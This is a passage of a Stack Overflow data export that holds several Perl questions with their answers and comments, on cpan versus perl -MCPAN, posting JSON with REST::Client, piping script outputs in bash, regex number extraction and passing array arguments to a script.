"last_edit_date": 1485875677, "creation_date": 1485875206, "answer_id": 41960889, "question_id": 41953111, "link": "https://stackoverflow.com/questions/41953111/cpan-vs-mcpan-perl/41960889#41960889", "title": "cpan vs -MCPAN - Perl", "body": "<p><code>cpan</code> installs for the <code>perl</code> in the shebang (<code>#!</code>) line of the <code>cpan</code> file.</p>\n\n<p>When someone has more than one <code>perl</code> installed on a machine, they sometimes run the wrong copy of <code>cpan</code>, and thus end up installing modules for the wrong instance of <code>perl</code>.</p>\n\n<p>One solution to that would be to specify the full path to the correct <code>cpan</code> file.</p>\n\n<p><code>perl -MCPAN -e shell</code> is the other solution. It allows you to explicitly specify the install of <code>perl</code> for which you want the modules to be installed.</p>\n"}], "owner": {"reputation": 1744, "user_id": 1191147, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/cZDaT.jpg?s=128&g=1", "display_name": "Hashim Aziz", "link": "https://stackoverflow.com/users/1191147/hashim-aziz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1606, "favorite_count": 2, "accepted_answer_id": 41960889, "answer_count": 2, "score": 4, "last_activity_date": 1557189880, "creation_date": 1485852257, "last_edit_date": 1557189880, "question_id": 41953111, "link": "https://stackoverflow.com/questions/41953111/cpan-vs-mcpan-perl", "title": "cpan vs -MCPAN - Perl", "body": "<p>I'm currently running <code>bash</code> via Cygwin on Windows, and I've come across two different ways to install a Perl module</p>\n\n<pre><code>cpan Name::Module\n</code></pre>\n\n<p>and</p>\n\n<pre><code>perl -MCPAN -e shell\n\ninstall Name::Module\n</code></pre>\n\n<p>What's the difference between these two methods, and do they offer any advantages or disadvantages over the other?</p>\n"}, {"tags": ["perl", "rest", "parameter-passing"], "comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1485851820, "post_id": 41952600, "comment_id": 71085066, "body": "Use a hash of hashes, serialize to JSON via a proper module (<a href=\"http://p3rl.org/JSON::PP\" rel=\"nofollow noreferrer\">JSON::PP</a> is in core)."}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1485853329, "post_id": 41952600, "comment_id": 71085894, "body": "It should be <code>To =&gt; [ &#39;90535xxxx&#39; ]</code>, but it doesn&#39;t seem to be the reason of the failure."}, {"owner": {"reputation": 177, "user_id": 3050035, "user_type": "registered", "accept_rate": 6, "profile_image": "https://www.gravatar.com/avatar/f6a68c414ec87ff9498e005268526e57?s=128&d=identicon&r=PG&f=1", "display_name": "kadir_beyazli", "link": "https://stackoverflow.com/users/3050035/kadir-beyazli"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1485853687, "post_id": 41952600, "comment_id": 71086085, "body": "@choroba, I realized it and sent array as &#39;To&#39; parameter. I see that my encoded json data is correct but it still gives error"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1485855629, "post_id": 41952600, "comment_id": 71087332, "body": "The error suggests the system tried to decode the data as XML, not JSON."}, {"owner": {"reputation": 177, "user_id": 3050035, "user_type": "registered", "accept_rate": 6, "profile_image": "https://www.gravatar.com/avatar/f6a68c414ec87ff9498e005268526e57?s=128&d=identicon&r=PG&f=1", "display_name": "kadir_beyazli", "link": "https://stackoverflow.com/users/3050035/kadir-beyazli"}, "reply_to_user": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 0, "creation_date": 1485857896, "post_id": 41952600, "comment_id": 71088768, "body": "@choroba it worked when I wrote endpoint correct :)"}], "answers": [{"tags": [], "owner": {"reputation": 177, "user_id": 3050035, "user_type": "registered", "accept_rate": 6, "profile_image": "https://www.gravatar.com/avatar/f6a68c414ec87ff9498e005268526e57?s=128&d=identicon&r=PG&f=1", "display_name": "kadir_beyazli", "link": "https://stackoverflow.com/users/3050035/kadir-beyazli"}, "is_accepted": false, "score": -1, "last_activity_date": 1485857948, "creation_date": 1485857948, "answer_id": 41954968, "question_id": 41952600, "link": "https://stackoverflow.com/questions/41952600/perl-rest-web-service-parameters/41954968#41954968", "title": "Perl Rest Web Service Parameters", "body": "<p>I wrote end-point address incorrect, it worked at the format I wrote, sorry for this situation.</p>\n"}], "owner": {"reputation": 177, "user_id": 3050035, "user_type": "registered", "accept_rate": 6, "profile_image": "https://www.gravatar.com/avatar/f6a68c414ec87ff9498e005268526e57?s=128&d=identicon&r=PG&f=1", "display_name": "kadir_beyazli", "link": "https://stackoverflow.com/users/3050035/kadir-beyazli"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 379, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1485857948, "creation_date": 1485850272, "last_edit_date": 1485853341, "question_id": 41952600, "link": "https://stackoverflow.com/questions/41952600/perl-rest-web-service-parameters", "title": "Perl Rest Web Service Parameters", "body": "<p>I am trying to call REST web service as follows:</p>\n\n<pre><code>my $client = REST::Client-&gt;new();\n\n$client-&gt;setHost(\"http://myhost.com\");\n\n$client-&gt;POST('/xx/yy/Submit',\n              $params,\n              {'Content-type' =&gt; 'application/json'}\n             );\n\nmy $response = $client-&gt;responseContent();\n</code></pre>\n\n<p>I do not how to create parameter list, api definition is as follows:</p>\n\n<pre><code>{\n    \"Credential\": {\n            \"Username\": \"String\",\n            \"Password\": \"String\"\n    },\n    \"DataCoding\": \"Default\",\n    \"Header\": {\n            \"From\": \"String\",\n            \"ValidityPeriod\": 0\n    },\n    \"Message\": \"String\",\n    \"To\": [\"String\"]\n}\n</code></pre>\n\n<p>I tried following but did not work:</p>\n\n<pre><code>my %params = (Credential =&gt; {\n                                Username =&gt; $username,\n                                Password =&gt; $password\n                            },\n              DataCoding =&gt; 'Default',\n              Header     =&gt; {\n                                From =&gt; $from,  \n                                ValidityPeriod =&gt; 0         \n                            },              \n              Message  =&gt; \"Test\",\n              To       =&gt; ['90535xxxx','90542xxxxx']\n           );\n\n$client-&gt;POST('/v1/xml/syncreply/Submit',\n              encode_json(\\%params),\n              {'Content-type' =&gt; 'application/json',\n                'Accept' =&gt; 'application/json'\n              }\n             );\n</code></pre>\n\n<p>It gives following error:</p>\n\n<pre><code>&lt;ErrorCode&gt;SerializationException&lt;/ErrorCode&gt;\nError: System.Runtime.Serialization.SerializationException: There was an error deserializing the object of type Barabut.Gw.Submit. The data at the root level is invalid. Line 1, position 1. ---&amp;amp;gt; System.Xml.XmlException: The data at the root level is invalid. Line 1, position 1.\n</code></pre>\n"}, {"tags": ["python", "linux", "bash", "perl", "shell"], "comments": [{"owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 0, "creation_date": 1485849804, "post_id": 41952421, "comment_id": 71083983, "body": "by calling the scripts with the correct filenames, the same as when doing it by hand, except it&#39;s in a script. No magic neeed."}, {"owner": {"reputation": 198293, "user_id": 707111, "user_type": "moderator", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/oXZkh.jpg?s=128&g=1", "display_name": "Ry-", "link": "https://stackoverflow.com/users/707111/ry"}, "edited": false, "score": 0, "creation_date": 1485849858, "post_id": 41952421, "comment_id": 71084011, "body": "Do the scripts require specific input/output files? Typically you\u2019d just pipe them together as <code>&lt; input1.tsv perl script1.pl | perl script2.pl | perl script3.pl &gt; outputs2</code> (and write the scripts so that\u2019s possible, of course)"}, {"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1485849864, "post_id": 41952421, "comment_id": 71084017, "body": "If the script always outputs to a hard-wired file name, there&#39;s no other way than to change the script."}, {"owner": {"reputation": 62800, "user_id": 391161, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/fb76d8bcc69144a3ee4c893ece7fc588?s=128&d=identicon&r=PG&f=1", "display_name": "merlin2011", "link": "https://stackoverflow.com/users/391161/merlin2011"}, "edited": false, "score": 0, "creation_date": 1485849880, "post_id": 41952421, "comment_id": 71084027, "body": "Can you please explain why simply running the three commands in a row in your bash script doesn&#39;t work?"}, {"owner": {"reputation": 12258, "user_id": 4596596, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/b00c839c9e28eb73aeb299bf3ef69a76?s=128&d=identicon&r=PG&f=1", "display_name": "ShanZhengYang", "link": "https://stackoverflow.com/users/4596596/shanzhengyang"}, "reply_to_user": {"reputation": 62800, "user_id": 391161, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/fb76d8bcc69144a3ee4c893ece7fc588?s=128&d=identicon&r=PG&f=1", "display_name": "merlin2011", "link": "https://stackoverflow.com/users/391161/merlin2011"}, "edited": false, "score": 0, "creation_date": 1485850342, "post_id": 41952421, "comment_id": 71084242, "body": "@merlin2011 The problem is I actually don&#39;t know what <code>outputs</code> is. The file name changes based on the original <code>inputs1.tsv</code>. Now, it is true that I know the file extension of the outputs. But <code>outputs1</code> and <code>outputs2</code> have the same file extension."}, {"owner": {"reputation": 62800, "user_id": 391161, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/fb76d8bcc69144a3ee4c893ece7fc588?s=128&d=identicon&r=PG&f=1", "display_name": "merlin2011", "link": "https://stackoverflow.com/users/391161/merlin2011"}, "edited": false, "score": 0, "creation_date": 1485850605, "post_id": 41952421, "comment_id": 71084372, "body": "@ShanZhengYang, Is the output file name a deterministic function of the input name? If so, you could do the transformation inside your bash script."}, {"owner": {"reputation": 185733, "user_id": 152948, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/194ef8f807c34a9d7aab0e11a8674768?s=128&d=identicon&r=PG", "display_name": "hobbs", "link": "https://stackoverflow.com/users/152948/hobbs"}, "edited": false, "score": 1, "creation_date": 1485850715, "post_id": 41952421, "comment_id": 71084442, "body": "@ShanZhengYang that would be good information to have in the question."}], "answers": [{"comments": [{"owner": {"reputation": 12258, "user_id": 4596596, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/b00c839c9e28eb73aeb299bf3ef69a76?s=128&d=identicon&r=PG&f=1", "display_name": "ShanZhengYang", "link": "https://stackoverflow.com/users/4596596/shanzhengyang"}, "edited": false, "score": 0, "creation_date": 1485850450, "post_id": 41952529, "comment_id": 71084287, "body": "&quot;In your case, you could write a script like this&quot; see comments above. The problem is I actually don&#39;t know what outputs is. The file name changes based on the original inputs1.tsv. Now, it is true that I know the file extension of the outputs. But outputs1 and outputs2 have the same file extension."}, {"owner": {"reputation": 12258, "user_id": 4596596, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/b00c839c9e28eb73aeb299bf3ef69a76?s=128&d=identicon&r=PG&f=1", "display_name": "ShanZhengYang", "link": "https://stackoverflow.com/users/4596596/shanzhengyang"}, "edited": false, "score": 0, "creation_date": 1485850526, "post_id": 41952529, "comment_id": 71084331, "body": "<code>perl script1.pl &lt; input1.tsv | perl script2.pl | perl script3.pl</code>  I may be missing something. The script works by <code>perl script.pl --i input</code>. How does ``perl script1.pl &lt; input1.tsv | perl script2.pl ` pipe the output of <code>perl script1.pl</code> to be read correctly by <code>perl script2.pl</code>?"}, {"owner": {"reputation": 1064, "user_id": 985075, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-hbsqWH3aUr4/AAAAAAAAAAI/AAAAAAAABhM/BpQU9smknzg/photo.jpg?sz=128", "display_name": "Alex L", "link": "https://stackoverflow.com/users/985075/alex-l"}, "reply_to_user": {"reputation": 12258, "user_id": 4596596, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/b00c839c9e28eb73aeb299bf3ef69a76?s=128&d=identicon&r=PG&f=1", "display_name": "ShanZhengYang", "link": "https://stackoverflow.com/users/4596596/shanzhengyang"}, "edited": false, "score": 0, "creation_date": 1485851502, "post_id": 41952529, "comment_id": 71084884, "body": "What I&#39;m saying is that if you had the opportunity to write it from scratch yourself, I&#39;d recommend writing it so that it read from stdin and wrote to stdout--then you wouldn&#39;t have any constraints on the filenames. If you don&#39;t know and can&#39;t predict the names of the output files of the various scripts, it makes it hard to automate. You could do things like capture the names of all the files in the directory, run the script, capture the names again, and see what&#39;s changed. That&#39;s getting a little ridiculous, but it sounds like you might not have a lot of better options..."}], "tags": [], "owner": {"reputation": 1064, "user_id": 985075, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-hbsqWH3aUr4/AAAAAAAAAAI/AAAAAAAABhM/BpQU9smknzg/photo.jpg?sz=128", "display_name": "Alex L", "link": "https://stackoverflow.com/users/985075/alex-l"}, "is_accepted": true, "score": 0, "last_activity_date": 1485849981, "creation_date": 1485849981, "answer_id": 41952529, "question_id": 41952421, "link": "https://stackoverflow.com/questions/41952421/without-re-writing-python-perl-scripts-how-would-i-pipe-outputs-together-in-a-b/41952529#41952529", "title": "Without re-writing Python/Perl scripts, how would I pipe outputs together in a bash script?", "body": "<p>Best practice for cases like this is to have the scripts read from stdin and write to stdout. In that case, it becomes very easy to pipe them together, like this:</p>\n\n<pre><code>perl script1.pl &lt; input1.tsv | perl script2.pl | perl script3.pl\n</code></pre>\n\n<p>In your case, you could write a script like this:</p>\n\n<pre><code>#!/bin/sh\nperl script1.pl --i input1.tsv\nperl script2.pl --i outputs1 \nperl script3.pl --i outputs2\n</code></pre>\n\n<p>It's not ideal, but it would do what you want. It would read input1.tsv, and write outputs3.</p>\n"}, {"comments": [{"owner": {"reputation": 12258, "user_id": 4596596, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/b00c839c9e28eb73aeb299bf3ef69a76?s=128&d=identicon&r=PG&f=1", "display_name": "ShanZhengYang", "link": "https://stackoverflow.com/users/4596596/shanzhengyang"}, "edited": false, "score": 0, "creation_date": 1485850411, "post_id": 41952634, "comment_id": 71084273, "body": "Unfortunately, I would have to write a <code>--o</code> flag"}, {"owner": {"reputation": 582, "user_id": 5825656, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/236386d605aa96f3712de0f3c1d9bc16?s=128&d=identicon&r=PG&f=1", "display_name": "Robin Davis", "link": "https://stackoverflow.com/users/5825656/robin-davis"}, "reply_to_user": {"reputation": 12258, "user_id": 4596596, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/b00c839c9e28eb73aeb299bf3ef69a76?s=128&d=identicon&r=PG&f=1", "display_name": "ShanZhengYang", "link": "https://stackoverflow.com/users/4596596/shanzhengyang"}, "edited": false, "score": 0, "creation_date": 1485850684, "post_id": 41952634, "comment_id": 71084422, "body": "Yep, if the script is just hard-coded to some filename then you&#39;re pretty much screwed!"}], "tags": [], "owner": {"reputation": 582, "user_id": 5825656, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/236386d605aa96f3712de0f3c1d9bc16?s=128&d=identicon&r=PG&f=1", "display_name": "Robin Davis", "link": "https://stackoverflow.com/users/5825656/robin-davis"}, "is_accepted": false, "score": -1, "last_activity_date": 1519918374, "last_edit_date": 1519918374, "creation_date": 1485850387, "answer_id": 41952634, "question_id": 41952421, "link": "https://stackoverflow.com/questions/41952421/without-re-writing-python-perl-scripts-how-would-i-pipe-outputs-together-in-a-b/41952634#41952634", "title": "Without re-writing Python/Perl scripts, how would I pipe outputs together in a bash script?", "body": "<p>Your question doesn't say this, but assuming you may specify the output file using a <code>--o</code> flag:</p>\n\n<pre><code>perl script1.pl --i input1.tsv --o /dev/stdout | perl script2.pl --i /dev/stdin --o /dev/stdout | perl script3.pl --i /dev/stdin --o final_output\n</code></pre>\n\n<p><code>/dev/stdin</code> and <code>/dev/stdout</code> are magical unix files that write to the process\u2019 <code>stdin</code> and <code>stdout</code> respectively.</p>\n"}], "owner": {"reputation": 12258, "user_id": 4596596, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/b00c839c9e28eb73aeb299bf3ef69a76?s=128&d=identicon&r=PG&f=1", "display_name": "ShanZhengYang", "link": "https://stackoverflow.com/users/4596596/shanzhengyang"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 79, "favorite_count": 0, "accepted_answer_id": 41952529, "answer_count": 2, "score": -2, "last_activity_date": 1519918374, "creation_date": 1485849525, "last_edit_date": 1485881085, "question_id": 41952421, "link": "https://stackoverflow.com/questions/41952421/without-re-writing-python-perl-scripts-how-would-i-pipe-outputs-together-in-a-b", "title": "Without re-writing Python/Perl scripts, how would I pipe outputs together in a bash script?", "body": "<p>I have the following Perl scripts (though this applies to Python and other scripting languages): <code>script1.pl</code>, <code>script2.pl</code>, <code>script3.pl</code></p>\n\n<p>The way these scripts were written, users execute them with input flags, and the output is a file saved. </p>\n\n<pre><code>perl script1.pl --i input1.tsv   ## this outputs the file `outputs1`\nperl script2.pl --i outputs1     ## this outputs the file `outputs2`\nperl script3.pl --i outputs2     ## this outputs the file `final_output`\n</code></pre>\n\n<p>(For Pythonistas, this is <code>python script1.py</code>)</p>\n\n<p>Now, I would like to create an executable bash script that allows users to simply work with <code>input1</code> and get the output in return <code>final_output</code>. </p>\n\n<p>Here's how I would do this with only one perl script, <code>execute.sh</code>:</p>\n\n<pre><code>#!/bin/sh\n\nsource ~/.bash_profile\n\nFLAG1=\"--i=$1\"\n\nperl script1.pl $FLAG1\n</code></pre>\n\n<p>which could be run on the command line <code>execute.sh input1.tsv</code></p>\n\n<p>For my example with three scripts, how would I pipe the intermediate outputs into the intermediate scripts to created one <code>execute.sh</code> script, e.g. <code>outputs1</code> into <code>script2.pl</code>, then <code>outputs2</code> into <code>scripts3.pl</code>, etc.? </p>\n\n<p>Is there a way for me to do this without rewriting the perl/python scripts? </p>\n\n<p>EDIT: Additional information: The problem is I actually don't know what outputs is. The file name changes based on the original inputs1.tsv. Now, it is true that I know the file extension of the outputs. But outputs1 and outputs2 have the same file extension. </p>\n"}, {"tags": ["regex", "perl", "text"], "comments": [{"owner": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1485847452, "post_id": 41951753, "comment_id": 71082906, "body": "Do you want this <code>3.58e-01</code> as a value because if you edit <code>if($_=~&#47; result= (\\d+.\\d+e-\\d+)&#47;){</code> to <code>if($_=~&#47;result= (\\d+.\\d+e-\\d+)&#47;){</code>, This will capture the above described output only. Please edit your question with more details."}, {"owner": {"reputation": 13, "user_id": 5458921, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/hN3Oa.jpg?s=128&g=1", "display_name": "rahdirs", "link": "https://stackoverflow.com/users/5458921/rahdirs"}, "reply_to_user": {"reputation": 917, "user_id": 3014263, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/rFh51.jpg?s=128&g=1", "display_name": "AbhiNickz", "link": "https://stackoverflow.com/users/3014263/abhinickz"}, "edited": false, "score": 0, "creation_date": 1485848585, "post_id": 41951753, "comment_id": 71083424, "body": "@AbhiNickz: I&#39;ve added further details."}, {"owner": {"reputation": 97, "user_id": 1383710, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/7ed3ed265e6bdb864763553180fdf790?s=128&d=identicon&r=PG", "display_name": "Jaison", "link": "https://stackoverflow.com/users/1383710/jaison"}, "edited": false, "score": 0, "creation_date": 1485865341, "post_id": 41951753, "comment_id": 71093552, "body": "Try giving your file name as &quot;output_vth_&quot;.$vth.&quot;.txt&quot;"}, {"owner": {"reputation": 13, "user_id": 5458921, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/hN3Oa.jpg?s=128&g=1", "display_name": "rahdirs", "link": "https://stackoverflow.com/users/5458921/rahdirs"}, "reply_to_user": {"reputation": 97, "user_id": 1383710, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/7ed3ed265e6bdb864763553180fdf790?s=128&d=identicon&r=PG", "display_name": "Jaison", "link": "https://stackoverflow.com/users/1383710/jaison"}, "edited": false, "score": 0, "creation_date": 1485881045, "post_id": 41951753, "comment_id": 71104751, "body": "@Jaison: it gives a syntax error when i change the file name to that."}, {"owner": {"reputation": 97, "user_id": 1383710, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/7ed3ed265e6bdb864763553180fdf790?s=128&d=identicon&r=PG", "display_name": "Jaison", "link": "https://stackoverflow.com/users/1383710/jaison"}, "edited": false, "score": 0, "creation_date": 1485921823, "post_id": 41951753, "comment_id": 71121633, "body": "@rahdirs What is the error you are getting ?"}], "answers": [{"comments": [{"owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "reply_to_user": {"reputation": 13, "user_id": 5458921, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/hN3Oa.jpg?s=128&g=1", "display_name": "rahdirs", "link": "https://stackoverflow.com/users/5458921/rahdirs"}, "edited": false, "score": 1, "creation_date": 1485851457, "post_id": 41951963, "comment_id": 71084852, "body": "Please use <code>use strict;</code> and <code>use warnings;</code> in all your scripts - this really helps alot. Then try to use open in the 3-argument-mode - that way you don&#39;t forget to specify if you open it for reading or writing. And <code>close</code> all the file handles you don&#39;t need anymore, especially if you use them again. I don&#39;t see any closing of the <code>IN2</code> handle before you try to open it again. And you open it without specifying whether for input or output..."}], "tags": [], "owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "is_accepted": false, "score": 0, "last_activity_date": 1485852208, "last_edit_date": 1485852208, "creation_date": 1485847844, "answer_id": 41951963, "question_id": 41951753, "link": "https://stackoverflow.com/questions/41951753/extracting-numbers-from-a-text-file-using-perl/41951963#41951963", "title": "Extracting numbers from a text file using perl", "body": "<p>Is there more code you didn't give in the example? Like output of the result array? Otherwise there are some things to consider:</p>\n\n<ul>\n<li>leading space in regex: This will not match your example, since <code>result</code> there starts at the beginning of the line. In general, if you want to be more flexible with possibly occuring spaces, insert <code>\\s*</code> at the according places.</li>\n<li>scientific number matching: If you expect numbers other than scientific notation with negative exponents to appear, you have to adopt your regex that way. There are plenty of example out there.</li>\n</ul>\n\n<p>For your extended code:</p>\n\n<ul>\n<li>please use <code>use strict;</code> and <code>use warnings;</code> in every script</li>\n<li>use the 3-argument-mode of <a href=\"http://perldoc.perl.org/functions/open.html\" rel=\"nofollow noreferrer\"><code>open</code></a> and possibly lexical file handlers (<code>my $fh</code> instead of <code>FH</code>). The 3-argument-mode ensures you don't forget to specify the actual mode (read/write/etc.) in which to open the file, amongst other things.</li>\n<li><code>close(FH)</code> your file handlers before using them on other files</li>\n</ul>\n\n<p>Not closing <code>IN2</code> seems to be one problem in your code, for instance.</p>\n"}, {"tags": [], "owner": {"reputation": 2626, "user_id": 849967, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/137c89ef80ed860b95e68b42e0d5353e?s=128&d=identicon&r=PG", "display_name": "Kjetil S.", "link": "https://stackoverflow.com/users/849967/kjetil-s"}, "is_accepted": false, "score": 0, "last_activity_date": 1486470816, "creation_date": 1486470816, "answer_id": 42090025, "question_id": 41951753, "link": "https://stackoverflow.com/questions/41951753/extracting-numbers-from-a-text-file-using-perl/42090025#42090025", "title": "Extracting numbers from a text file using perl", "body": "<p>This might work:</p>\n\n<pre><code>open my $fh, '&lt;', $filename or die;\nmy @array;\n/result\\s*=\\s*(\\S+)/i and push @array, 0+$1 while &lt;$fh&gt;;    # 0+$1 or just $1\nclose $fh;\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 5458921, "user_type": "registered", "accept_rate": 25, "profile_image": "https://i.stack.imgur.com/hN3Oa.jpg?s=128&g=1", "display_name": "rahdirs", "link": "https://stackoverflow.com/users/5458921/rahdirs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 197, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1486470816, "creation_date": 1485847090, "last_edit_date": 1485887873, "question_id": 41951753, "link": "https://stackoverflow.com/questions/41951753/extracting-numbers-from-a-text-file-using-perl", "title": "Extracting numbers from a text file using perl", "body": "<p>I have a text file which has data of the form ..</p>\n\n<blockquote>\n  <blockquote>\n    <p>*****yz = 1.4333******</p>\n    \n    <p>result= 3.58e-01</p>\n    \n    <hr>\n    \n    <p>*******ayf = 25.00\n    ****yz = 1.34<br>\n    result= 3.24e-01</p>\n  </blockquote>\n</blockquote>\n\n<hr>\n\n<p>I want to extract the values beside result &amp; push it into an array.</p>\n"}, {"tags": ["perl", "shell"], "comments": [{"owner": {"reputation": 28476, "user_id": 6862601, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/ppP5k.jpg?s=128&g=1", "display_name": "codeforester", "link": "https://stackoverflow.com/users/6862601/codeforester"}, "edited": false, "score": 0, "creation_date": 1485844894, "post_id": 41951035, "comment_id": 71081873, "body": "You don&#39;t need to do anything special.  Just send all arguments as a space separated list."}], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 7493393, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-Pvmxh6cVAQk/AAAAAAAAAAI/AAAAAAAAANo/435g5JVuGV0/photo.jpg?sz=128", "display_name": "swapnil shinde", "link": "https://stackoverflow.com/users/7493393/swapnil-shinde"}, "edited": false, "score": 0, "creation_date": 1485856768, "post_id": 41952185, "comment_id": 71088046, "body": "Thanks. I created array variable and passed as an argument it worked."}], "tags": [], "owner": {"reputation": 251, "user_id": 7095760, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1075cc785326ad3cb890f95b3446009e?s=128&d=identicon&r=PG&f=1", "display_name": "SREagle", "link": "https://stackoverflow.com/users/7095760/sreagle"}, "is_accepted": false, "score": 0, "last_activity_date": 1485848660, "creation_date": 1485848660, "answer_id": 41952185, "question_id": 41951035, "link": "https://stackoverflow.com/questions/41951035/call-perl-script-from-shell-script-with-two-arguments-1-filename-and-2array-of/41952185#41952185", "title": "call perl script from shell script with two arguments 1) filename and 2)array of integers", "body": "<p>If the perl script you're calling is expecting the integer array in one argument, you probably have to quote it accordingly to the shell you're using. So put it in double quotes for Windows' cmd.exe and in single or double quotes for about any other shell.</p>\n\n<p>E.g.:\n<code>perl yourscript.pl filename.txt \"1 2 3 4\"</code> for cmd.exe</p>\n\n<p>or</p>\n\n<p><code>yourscript.pl filename.txt '1 2 3 4'</code> for bash, Powershell, etc.</p>\n\n<p>Otherwise the integer arguments arrive one at a time in perl, instead of a single argument.</p>\n"}], "owner": {"reputation": 1, "user_id": 7493393, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-Pvmxh6cVAQk/AAAAAAAAAAI/AAAAAAAAANo/435g5JVuGV0/photo.jpg?sz=128", "display_name": "swapnil shinde", "link": "https://stackoverflow.com/users/7493393/swapnil-shinde"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1138, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1485848660, "creation_date": 1485844101, "question_id": 41951035, "link": "https://stackoverflow.com/questions/41951035/call-perl-script-from-shell-script-with-two-arguments-1-filename-and-2array-of", "title": "call perl script from shell script with two arguments 1) filename and 2)array of integers", "body": "<p>I want to call perl script which scans a file for processing from shell script.\nPerl script is using two arguments 1) File name 2) Array of integers \nI need to know how should I call(Syntax) perl script from shell script with two arguments 1) String 2) Array</p>\n\n<p>Thanks in advance.. </p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 4, "creation_date": 1485842615, "post_id": 41950624, "comment_id": 71080967, "body": "It seems that all you need is <code>while (my $answer = 